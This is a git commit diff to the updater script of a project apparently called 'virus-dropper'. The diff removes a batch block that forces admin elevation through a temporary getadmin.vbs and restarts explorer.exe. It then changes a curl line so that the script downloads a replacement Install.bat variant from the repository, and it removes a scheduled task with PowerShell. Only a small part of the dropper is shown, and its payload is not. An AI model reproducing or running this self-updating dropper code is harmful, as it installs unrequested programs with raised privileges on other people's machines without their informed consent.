b20031e10fbbbcbe6f0ada13294a8aefd4c4183f
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-29 21:31:09 -0400

    Update Install.bat

--- updater/Install.bat
+++ updater/Install.bat
@@ -1,33 +1,8 @@
 @echo off
-:: BatchGotAdmin
-::-------------------------------------
-REM  --> Check for permissions
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"="
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    taskkill /f /IM explorer.exe
-    start explorer.exe
-    exit /B
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-
-
 
 ::Create a copy of install.bat, and edit items inside as directed
 ::Edit this link to the DIRECT download link of the new install.bat
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/withoutRICKROLL.bat" --output "Install.bat"
 ::do not change --output
 
 powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
